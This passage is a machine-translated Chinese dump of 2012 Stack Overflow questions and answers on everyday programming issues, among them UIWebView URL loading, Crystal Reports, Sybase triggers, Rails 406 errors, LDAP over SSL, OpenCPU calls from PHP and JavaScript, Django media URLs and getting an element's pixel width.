    watcher = QtDBus.QDBusPendingCallWatcher(async, dev)
    watcher.finished.connect(dev.callFinishedSlot)
    sys.exit(app.exec_()) 
```

这应该适用于最新的 Linux 发行版，并且是使用 PyQt 调用返回复合类型的 D-Bus 方法的一个很好的例子。

# ios - 无法在 UIWebview 中打开以下 URL

> ID：11927812
> 
> 赞同：0
> 
> 时间：2012-08-13T03:20:26.407
> 
> 标签：ios

我无法在 UIWebview 中打开以下 URL

```
http://ad.doubleclick.net/click%3Bh%3Dv8/3ccb/3/0/%2a/v%3B260459540%3B0-0%//3B1%3B42477956%3B2825-320/56%3B38531391/38549148/1%3B%3B%7Esscs%3D%3fhttp://www.google.com/ 
```

我正在尝试在 UIwebview 中打开但未加载此 URL

```
NSURL *url = [NSURL URLWithString:advertisement_url];
[[UIApplication sharedApplication] openURL:url]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:57:24.487

当我将该地址放入 Chrome 时，它​​无法加载页面（只是变为空白），并且在 Internet Explorer 中它实际上会产生错误 -
Windows 找不到 'http://ad.doubleclick.net/click%3Bh%3Dv8/3ccb /3/0/%2a/v%3B260459540%3B0-0%//3B1%3B42477956%3B2825-320/56%3B38531391/38549148/1%3B%3B%7Esscs%3D%3fhttp://www.google。 com/' 检查拼写并重试。

我在模拟器中使用了以下代码，只是得到了一个类似于 Chrome 行为的白屏： `NSURL *url = [NSURL URLWithString:@"http://ad.doubleclick.net/click%3Bh%3Dv8/3ccb/3/0/%2a/v%3B260459540%3B0-0%//3B1%3B42477956%3B2825-320/56%3B38531391/38549148/1%3B%3B%7Esscs%3D%3fhttp://www.google.com/"];

NSURLRequest *requestObject = [NSURLRequest requestWithURL:url];
[myWebView loadRequest:requestObject];`

如果我将 URLWithString 更改为已知网站，它可以正常工作。也许仔细检查链接是否正确？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T06:06:02.110

我无法在浏览器（Mozilla、Chrome）中打开此网址。我认为这个网站正在使用某种授权。请从您的浏览器中清除 cookie 并检查您是否能够加载此 url。

# c# - 报告查看器不显示我分配的报告

> ID：11927815
> 
> 赞同：0
> 
> 时间：2012-08-13T03:22:09.983
> 
> 标签：c#, visual-studio-2010, crystal-reports, reporting

我是在 C# 中使用 ReportViewer 的新手。我正在尝试显示我使用水晶报表制作的报表。

这是我的代码：

```
private void button1_Click(object sender, EventArgs e)
    {
        ReportDocument cryRpt = new ReportDocument();
        cryRpt.Load("C:Users\\Document\\CrystalReport1.rpt");
        crystalReportViewer1.ReportSource = cryRpt;
        crystalReportViewer1.Refresh();
    } 
```

这是错误消息：

```
'Microsoft.Reporting.WinForms.ReportViewer' does not contain a definition for 'ReportSource' and no extension method 'ReportSource' accepting a first argument of type 'Microsoft.Reporting.WinForms.ReportViewer' could be found (are you missing a using directive or an assembly reference?) 
```

我已经添加了参考**Interop.CrystalActiveXReportViewerLib10**

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T06:33:20.957

您需要添加 CrystalDecisions.CrystalReports.Engine 作为参考以使您的程序正常工作。

[Visual Studio 2010 中的 CrystalReportViewer 控件](http://www.blog.mudasar.co.uk/?p=33)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-28T18:35:18.287

尝试添加 CrystalDecisions.ReportSource 库。另外，您使用的是哪个版本的 CR。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-25T09:58:30.467

检查此程序集 microsoft.reportviewer.winforms.dll 是否已添加到您的项目中。

# triggers - Sybase：如何访问更新触发器中更改的列

> ID：11927820
> 
> 赞同：0
> 
> 时间：2012-08-13T03:22:50.123
> 
> 标签：triggers, sybase

我正在编写一个触发器以在更新表后获取所有更改的列。我认为可以在更改特定字段时触发触发器。但这对于我的要求还不够通用。我可以通过比较插入和删除的表来做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T14:46:56.310

当您说“不够通用”时，听起来好像您已经考虑使用触发器作为找出哪些表中哪些列何时更改的一般方法，并且您想要一些/许多表的方法，这些表具有各种键和字段。

aF 建议使用“for”（或 after）触发器，您可以比较插入和删除，或者使用“if update(column-name)...”函数。

如果您想通用化事物，如果我理解的话，我认为这意味着您需要编写一些工具来获取您在某处配置为元数据的表列表，并将它们处理成执行您想要的触发器（例如将主键内容、表ID和更改的字段保存在某处。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T10:23:06.753

您可以创建一个`trigger`更新！然后检查更新了哪些列。

您还可以比较之前（`deleted`表）和之后（`inserted`表），但您还必须单独查看每一列。

# sql - SQL 日期间隔比较

> ID：11927821
> 
> 赞同：0
> 
> 时间：2012-08-13T03:22:58.040
> 
> 标签：sql, date, intervals

我有一份我正在为工作做的报告，我需要一些帮助。下面的查询我显示了我到目前为止所做的事情，我现在需要的是能够获得每天下降的每个学生的信息，而不是一次给我一个总数，换句话说，开始例如，在 04-23 和 05-23 之间，而不是一次获得总数显示从 04-23 到 04-27 的结果等等。如果有人可以提供帮助，我将不胜感激。谢谢聪明人

```
SELECT
      COUNT (dbo.cst_AdCancelsQE_vw.priorqecounter) AS 'Prior to QE',
      COUNT (dbo.cst_AdCancelsQE_vw.duringqecounter) AS 'During QE',
      COUNT (dbo.cst_AdCancelsQE_vw.afterqecounter) AS 'After QE',
      dbo.cst_AdCancelsQE_vw.Division,
      dbo.cst_AdCancelsQE_vw.Campus,
      LEFT(CONVERT (VARCHAR,dbo.cst_AdCancelsQE_vw.Startdate  , 101), 10)AS 'Start Date'

FROM dbo.cst_AdCancelsQE_vw
      --JOIN dbo.cst_AdStatusChanges_vw
            --ON dbo.cst_AdCancelsQE_vw.NewStatDescrip = dbo.cst_AdStatusChanges_vw.NewStatDescrip
WHERE StartDate IN ('2012-04-23', '2012-05-07', '2012-03-12')

GROUP BY dbo.cst_AdCancelsQE_vw.division, dbo.cst_AdCancelsQE_vw.campus, dbo.cst_AdCancelsQE_vw.startdate
ORDER BY dbo.cst_AdCancelsQE_vw.division, dbo.cst_AdCancelsQE_vw.campus ASC 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:28:18.477

而不是`WHERE`今天-昨天-和前一天，您应该说在今天和今天之间 - 3 天。

```
WHERE StartDate Between getdate() and getdate()-3 
```

你有一个过去3天的例子。您应该能够使其解决您的要求。这样，您就有了一个每天都有效的查询，如果您今天运行它，您将获得最近 3 天的结果，明天再运行它，您将获得一组新的结果。

# django - django-openid-auth django + openid 被 adblock 阻止

> ID：11927823
> 
> 赞同：1
> 
> 时间：2012-08-13T03:23:05.217
> 
> 标签：django, openid, django-authopenid

我正在使用 Python 的[django-openid-auth](https://bugs.launchpad.net/django-openid-auth)在我的站点中进行 OpenID 身份验证（通过外部 OpenID 提供程序）。

它的工作方式是设置指向本地 URL 的链接（例如 /openid/login），该 URL 会自动处理登录。问题是，我很惊讶似乎没有人遇到这个问题，处理这个问题的视图，创建一个包含所有数据的不可见表单并将其自动提交到外部身份验证页面，这是一个很大的 NO-NO Chrome 的 adblock，它会自动阻止请求的发生。最终结果是人们现在盯着一个空白页面（因为该视图的所有内容都是带有隐藏字段的表单）并且根本无法真正登录。

有解决方法吗？例如，能够将表单嵌入到现有页面并将按钮链接到表单提交，而不必通过那个空白页面？我一直在查看库文件，但除非绝对必要，否则我不想弄乱它（代码也不是最清晰的）。

提前致谢！

布鲁诺

# ruby-on-rails - Rails 中的基本 HTML 更新期间出现 406 错误（不是 jQuery、AJAX 或 JSON）

> ID：11927824
> 
> 赞同：0
> 
> 时间：2012-08-13T03:23:05.013
> 
> 标签：ruby-on-rails, ruby-on-rails-3

有没有人在 Rails 中进行非常基本的表单更新时遇到 406 错误？对象已更新，但重定向失败。我已经尝试将格式指定为 HTML 以及删除`respond_to do |format|`根据它正在更新为 HTML 的日志`ItemsController#update as HTML`

我确定我只是忽略了一些愚蠢的事情，但一直在努力解决这个问题。我不想通过 ajax 更新或访问 JSON。我尝试过使用标准`respond_to do |format|`并指定 HTML 以及`respond_to do |format|`完全删除。应用程序中的其余对象都可以编辑，没有这个问题。

在路线中

```
 resources :items 
```

在控制器中

```
def update
    @item = Item.find(params[:id])
    if @item.update_attributes(params[:item])
         redirect_to @item
    end
end 
```

在视图中

```
<%= form_for(@item) do |f| %>

     <%=f.text_field(:name)%>

     <div class="actions">
          <%= f.submit %>
     </div>
<% end %> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T11:32:36.293

您的更新操作还需要处理 update_attributes 为假的情况。就像是，

```
def update
  @item = Item.find(params[:id])
    if @item.update_attributes(params[:item])
      redirect_to @item
    else
      render 'edit'
    end
end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T12:02:26.760

作为 Shailen Tuli 答案的替代方案，请使用

```
@item.update_attributes!(params[:item]) 
```

（注意！）如果无法保存，它将产生错误。

406 主要意味着：Rails 没有任何东西可以发送回客户端，并且在您的情况下，当保存失败时会发生这种情况。

# c# - using 语句 - 它会触发垃圾收集吗？

> ID：11927827
> 
> 赞同：0
> 
> 时间：2012-08-13T03:23:40.347
> 
> 标签：c#, memory

我想做的是包装一些可能在 using 语句中泄漏的可疑函数以触发垃圾收集，有没有人使用或看到过这样的东西？这行得通吗？您对此有何看法？

```
using (String wrapper = new String("maybe this will trigger gc")){
  //do stuff here
  //or maybe:
  // function1();
  // function2();
  //
  //and then see if its leaking?

  // eg:
       _mygeometry = new Geometry();
       _mygeometry = null; // will GC free this ?
} 
```

你认为这会奏效吗？你以前用过这个吗？有什么我可以做的不是字符串吗？我正在使用 WPF，我尝试使用 (vargarbage = 1){} 并且不起作用，我想 String 可能会。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-13T03:31:31.870

[using](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)语句仅适用于那些实现[IDisposable](http://msdn.microsoft.com/en-us/library/system.idisposable.aspx)的类。它只是确保您在其中定义的对象将在块执行后或什至在发生某些异常时`using()`调用其方法。`Dispose`它与使用`try`with`finally`块类似。

如果您怀疑应用程序中存在内存泄漏，那么最好使用一些可用的内存分析器来检测问题。

您当前的代码不应编译为`String`类未实现`IDisposable`

编辑：

由于编辑的问题

```
_mygeometry = null; // will GC free this ? 
```

你应该看到这个 SO Link: [C#: should object variables are assigned to null?](https://stackoverflow.com/questions/3903878/c-should-object-variables-be-assigned-to-null) 并从VinayC回答

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:26:56.470

只有实现的类`IDisposable`才能在`using(...){...}`语句中使用。

> using 语句允许程序员指定使用资源的对象何时应该释放它们。提供给 using 语句的对象必须实现 IDisposable 接口。该接口提供了 Dispose 方法，该方法应该释放对象的资源。

资料来源：[MSDN](http://msdn.microsoft.com/en-us/library/yh598w02%28v=vs.80%29.aspx)

可惜`string` [没有实现这个接口](http://msdn.microsoft.com/en-us/library/system.string.aspx)。您是否怀疑某个字符串会导致您的应用程序出现内存泄漏？你在处理什么？你能发布一些代码，以便我们能够检查它吗？

# java - 通过 SSL 连接到 IBM Tivoli Directory 时 LDAP 搜索断开连接

> ID：11927828
> 
> 赞同：0
> 
> 时间：2012-08-13T03:24:04.933
> 
> 标签：java, ldap, openldap, tivoli, unboundid-ldap-sdk

我正在开发一个具有 LDAP 连接性的应用程序。到目前为止，我们只使用 Open JLDAP 库来执行 LDAP 搜索和身份验证。我们有许多成功使用此功能的客户，通过未加密和 SSL 连接连接到 Active Directory 和 Oracle Internet Directory。

我们最近有一个使用 IBM Tivoli Directory 的客户端，当处于标准模式（非 SSL）时，OpenLDAP 库可以很好地连接到该服务器，但是当使用 SSL 时，执行搜索时连接将断开。绑定和读取工作正常。

我们得到的错误是：

**LDAPException: Connection lost waiting for results from ldap.host:389 (91) Connect Error java.io.EOFException: BERDecoder: decode: EOF in Identifier**

我认为这是 JLDAP 的问题，所以我用 UnboundId LDAP 库替换了我们的代码，除了我遇到了类似的问题。连接仅在执行搜索时断开，仅在 SSL 下。

作为测试，我安装了 Tivoli Directory 的试用版，并启用了 SSL。JLDAP 和 UnBoundID 库都可以针对我的实例正常工作。

Tivoli 上是否有任何配置选项会导致仅在 SSL 下断开连接？

我有一个 LDAP 工具 (jxplorer)，它可以通过 SSL 连接和搜索客户端 LDAP 服务器。我认为 jxplorer 使用 JNDI 库进行 LDAP 连接。

我想看看在移植我的 LDAP 代码以使用 JNDI LDAP 代码之前是否还有什么可以尝试的...（可能仍然有同样的问题）。

欢迎提出想法...

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T22:43:10.763

服务器正在断开连接。看看它在 SSL 模式下的超时设置。

JXplorer 使用它自己的 LDAP 库，而不是 JNDI。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T05:47:31.690

我找到了自己的答案。Java 的 SSL 实现在 Java 1.6_18 到 Java 1.6_28 之间的 JNDI 库中存在问题，该问题在 Java 1.7 中也存在，直到最近的补丁。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-05-10T11:31:04.507

我看到了同样的例外：

```
LDAPException: Connection lost waiting for results from ldap.host:636 (91) Connect Error java.io.EOFException: BERDecoder: decode: EOF in Identifier 
```

尝试使用非 SSL 套接字工厂连接到 SSL 端口时。

# php - 与openCPU交互

> ID：11927829
> 
> 赞同：2
> 
> 时间：2012-08-13T03:24:23.730
> 
> 标签：php, drupal, curl, drupal-7, opencpu

我偶然发现了一个很棒的开源项目 openCPU.org，我对这个项目感到非常兴奋。作为一名试图创建一个网站来托管我的工作的研究科学家，我最希望能够在云上运行 R 以让我的脚本实时运行并显示在我的网页上。非常感谢 Jeroen 促成了这个项目。

有了这个，我的问题。

我到底如何与 openCPU 交互？

我可以将示例函数放入“运行一些代码”中：

[http://public.opencpu.org/userapps/opencpu/opencpu.demo/runco​​de/](http://public.opencpu.org/userapps/opencpu/opencpu.demo/runcode/)

并检索我的代码的 PNG 图像，这很棒！

但是如何在我自己的网页中或通过 URL 执行此操作？

我可以从此页面获取原始代码上传的对象，例如：“x3ce3bf3e33”

如果是类似的函数：

```
myfun <-function(){

x = seq(1,6.28)
y = cos(x)
p = plot(x,y)
print(p)
# also tried return(p)
} 
```

我不应该可以通过以下方式调用它：

[http://public.opencpu.org/R/tmp/x3ce3bf3e33/png](http://public.opencpu.org/R/tmp/x3ce3bf3e33/png)

输入变量呢？例如：

```
myfun <-function(foo){

x = seq(1,foo)
y = cos(x)
p = plot(x,y)
print(p)
} 
```

我觉得也许我缺少一些东西。如何使用 url 指定“GET”或“POST”？

**编辑**

好的，为了响应下面的@Jeroen，我需要使用 POST 和 GET 和 API。现在我的问题延伸到以下问题，即让 PHP 与它正确交互。

说我有代码：

```
<?php

$foo = 'bar';
$options = array(
    'method' => 'POST',
    'foo' => $foo,
    );
$url = "http://public.opencpu.org/R/tmp/x0188b9b9ce/save";
$result = drupal_http_request($url,$options); // drupal function
?> 
```

然后我如何访问 $result 中传回的内容？我正在寻找一张图表。它看起来像这样：

```
{
    "object" : null,
    "graphs" : [
        "x2acba9501a"
    ],
    "files" : {}
} 
```

下一步将是获取图像，类似于：

```
$newurl = "http://public.opencpu.org/R/tmp/".$result["graph"]."/png";
$image = drupal_http_request($newurl);
echo $image; 
```

但我不知道如何访问 $result 的各个元素？

编辑#2

好的，伙计们，我已经完成了这项工作，这要归功于下面的答案和其他多个帮助会话，以及很多我的头撞在显示器上。

我们开始了，用 cURL 完成

```
<?php

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://public.opencpu.org/R/tmp/x0188b9b9ce/save');
curl_setopt($ch, CURLOPT_POST, 1); // Method is "POST"
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Returns the curl_exec string, rather than just Logical value
$result = curl_exec($ch);
curl_close($ch);
$new = json_decode($result,true); // $result is in 'json' format, decode it
$get = $new['graphs'][0]; // the 'hashkey for the image, "x2acba9501a" above

$img = 'http://public.opencpu.org/R/tmp/'.$get.'/png'; // link to the png image

echo <<<END  // use this to display an image from the url
<a href="$img">
<img src="$img">
</a>
END

?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T10:17:59.570

OpenCPU 使用 HTTP POST 执行函数，使用 HTTP GET 读取/渲染对象和图形。您可以先将函数保存到临时存储，然后从那里调用它。[交互式手册](http://public.opencpu.org/pages/docs.html#r-tmp)的“/R/tmp API”一章中给出了一个基本示例。如果您单击名为 的红色演示按钮，`save a function`它将帮助您完成这些步骤。`get the function``call the function`

基本上在第一步中，您对身份函数执行 HTTP POST 以将您的函数保存在存储中。这也是您找到的[运行代码示例页面的第三种形式正在执行的操作。](http://public.opencpu.org/userapps/opencpu/opencpu.demo/runcode/)所以我只是在那里复制了你的代码，然后它返回给我 object `x0188b9b9ce`。

要检查一切是否正常，您可以使用 HTTP GET 读取此对象。例如，打开这个 url 来阅读你的函数的源代码：

```
http://public.opencpu.org/R/tmp/x0188b9b9ce/ascii 
```

例如，替代输出是将函数作为 RData 文件获取：

```
http://public.opencpu.org/R/tmp/x0188b9b9ce/rda 
```

重要的是 HTTP GET 从不*执行*函数。它只是查找内容，并以您请求的输出格式返回。所以现在你确信你的函数在我们想要运行的 store 中。为此，您需要再次进行 HTTP POST。例如要获取 PDF，您可以执行

```
POST http://public.opencpu.org/R/tmp/x0188b9b9ce/pdf
POST http://public.opencpu.org/R/tmp/x0188b9b9ce/svg
POST http://public.opencpu.org/R/tmp/x0188b9b9ce/png 
```

如果您调用的函数接受参数，则将它们作为参数包含在 HTTP POST 请求中。当你想在你的网页中包含输出时，通常你只想结合`/save`输出类型使用 HTTP POST。因此，您将使用 jquery 或其他任何方法：

```
POST http://public.opencpu.org/R/tmp/x0188b9b9ce/save 
```

这可能会返回如下内容：

```
{
    "object" : null,
    "graphs" : [
        "x2acba9501a"
    ],
    "files" : {}
} 
```

这表明您的函数已成功执行，并且它创建了一个绘图（耶！）。图形被保存到 tmp 存储。因此，您现在可以使用 HTTP GET 获取图形并将其嵌入到您的页面中：

```
http://public.opencpu.org/R/tmp/x2acba9501a/png
http://public.opencpu.org/R/tmp/x2acba9501a/png?!width=900&!height=500
http://public.opencpu.org/R/tmp/x2acba9501a/pdf
http://public.opencpu.org/R/tmp/x2acba9501a/svg 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-30T20:39:00.763

这是一个完整的示例网页，我模拟了使用 OpenCPU 来演示使用我编写的 R 包 (MARSS) 进行的特定分析。我一直在努力提供对特定分析的便捷访问——可以说是一个实时用户指南。警告，我的示例严重依赖 JavaScript，除此示例之外我没有使用 JavaScript 的经验；所以编码很笨拙，但它适用于我的目的。将 html 复制并粘贴到文件中并在浏览器中打开，它应该可以工作。

* * *

```
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style>
html, body
{
background: #6699FF;
text-align: center;
font-family : "Lucida Sans Unicode", "Lucida Grande", sans-serif;
font-size:14px;
}
#container
{
background: #FFF;
border: 0px #222 solid;
margin: 0 auto;
text-align: left;
width: 10.25in;
padding: 5px;
overflow: auto;
}
#container form
{
margin: 0 auto;
}
label
{
float: left;
width: 50px;
}
.leftCol
{
float: left;
width: 3in;
}
.rightCol
{
float: left;
width: 7in;
}
.references
{
font-size: x-small;
text-indent: 20px;
}
</style>
<base target="_blank" />
<title>Count-based population viability analysis (PVA) using corrupted data</title> 
<script type="text/javascript" src="http://code.jquery.com/jquery-latest.js">       </script>
<script>
baseurl="http://public.opencpu.org"          
// This is done on load since we need the function on the server to deal with the file upload
function saveRFunction(){
//Run this bit of code and store the R function to run on OpenCPU
var baseurl = "http://public.opencpu.org";
var url = "http://public.opencpu.org/R/pub/base/identity/save";
// #txtRCommands is the id of the text box in the javascript
var rFunction = $("#RFunction").val();
// this bit sends the the RFunction in the hidden text area
$.post(url,{ x: rFunction },  
function (data) { 
var funloc = $.parseJSON(data).object;
funloc = "http://public.opencpu.org/R/tmp/"+funloc;
//set the action for the form
document.getElementById('FunctionLocation').value = funloc;                  
} );              
setTimeout(function() {
// Wait 2 seconds because of Chrome before loading default form
var frm = document.getElementById("inputForm2");
subm2(frm,'/svg');
}, 1000); 
};
//function for first submit button; subm and subm2 same except the id
function subm(f,ftype){
document.getElementById("inputForm").action=document.getElementById('FunctionLocation').value+ftype;
f.submit();
}
function subm2(f,ftype){
document.getElementById("inputForm2").action=document.getElementById('FunctionLocation').value+ftype;
f.submit();
}
</script>

</head>
<body onload="saveRFunction()">
<div id="container">
<h2>MARSS Case Study 1: Count-based PVA for data with observation error</h2>
This web tool fits a count-based PVA model (sensu Dennis et al. 1991) from a univariate (one site) time series of abundance data with observation error (Holmes 2001, 2004).  The result is an estimated long-term rate of population growth (&lambda;), process variance estimate (&sigma;<sup>2</sup>) and non-process or observation error variance.  Extinction risk metrics sensu Dennis et al. (1991) along with an uncertainty plot sensu Ellner and Holmes (2008) are shown.
</br></br>
<div class="leftCol">
<form enctype="multipart/form-data" action="" method="POST" target="test" id="inputForm">
<fieldset>
<legend><b>Upload a Dataset</b></legend>
<i>Comma-delimited. 1st col time, 2nd col counts.  Missing counts NA.</i></br>
File: <input name="!file:file" type="file" /> <!-- param name has to be file -->
Header: <select name="header"><option value=TRUE> TRUE </option> <option value=FALSE> FALSE </option> </select> </br />
<input name="!width" type="hidden" value=7 /> <!-- in inches -->
<input name="!height" type="hidden" value=6 /> <!-- in inches -->
<INPUT type="button" name="Submit" value="Run Analysis" onclick="subm(this.form,'/svg');"> <!-- svg so Firefox doesn't cache -->
<INPUT type="button" name="Submit" value="Get PDF of Plot" onclick="subm(this.form,'/pdf');">           </fieldset>
</form>
<form action="" method="POST" target="test" id="inputForm2">
<fieldset>
<legend><b>Select an Example Dataset</b></legend>
Dataset: 
<select name="dataname">
<option value='"wilddogs"' selected >African Wilddogs</option>
<option value='"prairiechicken"'>Prairie Chickens</option>
<option value='"grouse"'>Sage Grouse</option>
<option value='"graywhales"'>Gray Whales</option>
</select></br />
<input name="!width" type="hidden" value=7 /> <!-- in inches -->
<input name="!height" type="hidden" value=6 /> <!-- in inches -->
<INPUT type="button" name="Submit" value="Run Analysis" onclick="subm2(this.form,'/svg');">
<INPUT type="button" name="Submit" value="Get PDF of Plot" onclick="subm2(this.form,'/pdf');">
</fieldset>
</form>
<fieldset class="references">
<legend><b>References</b></legend>
<p>Dennis, Brian, Patricia L. Munholland, and J. Michael Scott. "Estimation of growth and extinction parameters for endangered species." Ecological monographs 61.2 (1991): 115-143.</p>
<p>Holmes, E. E. 2001\. Estimating risks in declining populations with poor data. Proceedings of the National Academy of Science 98: 5072-5077.</p>
</fieldset>
<fieldset class="references">
<legend><b>R Code</b></legend>
<!-- if you do not want to see the R code, use this <textarea hidden="hidden" id="RFunction" style="display:none;"> -->
<textarea id="RFunction" readonly="readonly" cols="27" rows="18" style="border:0px;margin:0px">
function(file=NULL, header=TRUE,  dataname="wilddogs" ){

library(MARSS)

if(is.null(file)){
dat=get(dataname)
}else{
dat=read.csv(file, header=header)
dat=as.matrix(dat)
}

CSEGriskfigure(dat, silent=TRUE)
}
</textarea> 
</fieldset>
<input type="hidden" value="not set" id="FunctionLocation" /> <!-- this is where the function is stored -->
<br />
</div>
<!-- This iframe holds the output image. -->
<iframe style='width: 7in; height: 6in; border: 0px solid #000000; padding: 10px;' name='test' id="image_iframe" class="rightCol"></iframe>      
</div> 
<!-- This is an onload script, but Chrome is not loading the whole page before running the onload script.  Time out used above for this problem. -->
</body>
</html> 
```

# python - 图像未显示在 Django 模板中

> ID：11927841
> 
> 赞同：0
> 
> 时间：2012-08-13T03:26:06.507
> 
> 标签：python, django, image, django-templates

我在顶部设置了我的 settings.py 文件，以获取模板和媒体的绝对路径：

```
import os.path
import django

DJANGO_ROOT = os.path.dirname(os.path.realpath(django.__file__))
SITE_ROOT = lambda x: os.path.join(os.path.abspath(os.path.dirname(__file__)), x)

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',

MEDIA_ROOT = SITE_ROOT('media'),
MEDIA_URL = '/media/'

TEMPLATE_DIRS = (
    SITE_ROOT('templates'),
) 
```

我的模型看起来像这样：

```
class Work(models.Model):
    sample = models.ImageField(upload_to='screenshots/%Y/%m/%d/')
    name = models.CharField(max_length=200)
    url = models.URLField(blank=True) 
```

同步和创建模板后，我使用了变量

```
{{ work.sample }} 
```

调用使用 ImageField 上传的图像。运行服务器后，图像未显示。输出很简单

```
<img src="screenshots/2012/08/09/1.png"> 
```

绝对路径未显示在标记中，因此未正确调用图像。其他信息显示得很好。谁能帮我解决这个问题？我确信这是一个简单的解决方法，我只是想不通。顺便说一句，我正在本地运行它。希望这是足够的信息继续下去。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:41:04.423

您必须`MEDIA_URL`在字段之前单独输出，以便显示完整的 URL。不要忘记`RequestContext`在渲染模板时使用 a ，并且适当的上下文处理器已经到位。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T08:11:04.217

我希望这会帮助你

更改设置.py

```
MEDIA_ROOT = '/path/to/static/folder/static'

 #Your static file location  
MEDIA_URL = 'http://localhost/static'  # i am asuming you are working on localhost

# Absolute path to the directory static files should be collected to.
# Don't put anything in this directory yourself; store your static files
# in apps' "static/" subdirectories and in STATICFILES_DIRS.
# Example: "/home/media/media.lawrence.com/static/"
STATIC_ROOT = ''

# URL prefix for static files.
# Example: "http://media.lawrence.com/static/"
STATIC_URL = '/static/ 
```

' 将你的 apache 链接到 django 静态文件夹

并使用 `<img src="{{ MEDIA_URL }}screenshots/2012/08/09/1.png />`

# javascript - 从样式设置为 % 的元素获取宽度（以像素为单位）？

> ID：11927844
> 
> 赞同：86
> 
> 时间：2012-08-13T03:26:53.340
> 
> 标签：javascript, html, css

我有这个元素：

```
<div style="width: 100%; height: 10px;"></div> 
```

我想得到它的像素宽度。我刚试过这个：

```
document.getElementById('banner-contenedor').style.width 
```

哪个返回`100%`。是否可以使用 JavaScript 以像素为单位实际获取元素的宽度？

* * *

## 回答 #1

> 赞同：113
> 
> 时间：2012-08-13T03:30:32.400

```
document.getElementById('banner-contenedor').clientWidth 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-08-13T03:30:47.563

您想获得计算出的宽度。尝试：`.offsetWidth`

（即：`this.offsetWidth='50px'`或`var w=this.offsetWidth`）

您可能还喜欢关于 SO 的[这个答案。](https://stackoverflow.com/a/294273/4298200)

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2015-03-16T20:00:32.750

没有一个答案能满足香草 JS 中的要求，我想要一个香草的答案，所以我自己做了。

clientWidth 包括填充，offsetWidth 包括其他所有内容（[jsfiddle 链接](http://jsfiddle.net/y8Y32/25/)）。您想要的是获得计算的样式（[jsfiddle 链接](http://jsfiddle.net/ud90pt42/)）。

```
function getInnerWidth(elem) {
    return parseFloat(window.getComputedStyle(elem).width);
} 
```

编辑：`getComputedStyle`是非标准的，并且可以以像素以外的单位返回值。如果元素有滚动条，一些浏览器还会返回一个值，该值会考虑滚动条（这反过来会给出与 CSS 中设置的宽度不同的值）。如果元素有滚动条，则必须通过从`offsetWidth`.

```
function getInnerWidth(elem) {
    var style = window.getComputedStyle(elem);
    return elem.offsetWidth - parseFloat(style.paddingLeft) - parseFloat(style.paddingRight) - parseFloat(style.borderLeft) - parseFloat(style.borderRight) - parseFloat(style.marginLeft) - parseFloat(style.marginRight);
} 
```

尽管如此，根据我目前的经验，这可能不是我建议遵循的答案，我会求助于不那么依赖 JavaScript 的方法。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2017-05-09T07:32:35.117

您可以使用`offsetWidth`. 有关更多信息，请参阅此**[帖子](https://stackoverflow.com/q/294250/6521116)**和**[问题](https://stackoverflow.com/q/294250/6521116)**。

```
console.log("width:" + document.getElementsByTagName("div")[0].offsetWidth + "px");
```

```
div {border: 1px solid #F00;}
```

```
<div style="width: 100%; height: 10px;"></div>
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-13T03:30:21.870

试试 jQuery：

```
$("#banner-contenedor").width(); 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-08-11T08:11:51.307

这个 jQuery 对我有用：

```
$("#banner-contenedor").css('width'); 
```

这将为您提供计算出的宽度

[http://api.jquery.com/css/](http://api.jquery.com/css/)

* * *

## 回答 #7

> 赞同：-4
> 
> 时间：2016-12-15T22:15:35.553

```
yourItem.style['cssProperty'] 
```

这样你就可以动态调用属性字符串

# python - 套接字编程中的 EWOULDBLOCK 错误

> ID：11927848
> 
> 赞同：3
> 
> 时间：2012-08-13T03:27:37.820
> 
> 标签：python, sockets

我在非阻塞模式下使用套接字，客户端连续向服务器发送数据，虽然我为套接字设置的缓冲区足够大以保存来自客户端的所有数据但Ewouldblock总是抛出，我不知道为什么，你能详细解释一下吗关于这个 Ewouldblock。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T03:31:05.017

EWOULDBLOCK 表示发送时套接字发送缓冲区已满，或者接收时套接字接收缓冲区为空。您应该使用`select()`来检测这些条件何时变为错误。

# javascript - Google Maps v3 API - 自动完成（地址）

> ID：11927849
> 
> 赞同：45
> 
> 时间：2012-08-13T03:27:41.777
> 
> 标签：javascript, google-maps, google-maps-api-3, autocomplete

试图让我的谷歌地图应用程序自动完成工作。

这是当前代码：

HTML

```
<input type="text" class="clearText" id="address" name="address" value="" size=20 autocomplete="off"> 
```

Javascript

```
 var input = document.getElementById('address');
    var options = {
        componentRestrictions: {country: 'au'}
    };
    var autocomplete = new google.maps.places.Autocomplete(input, options); 
```

不幸的是，输入地址时没有任何反应。

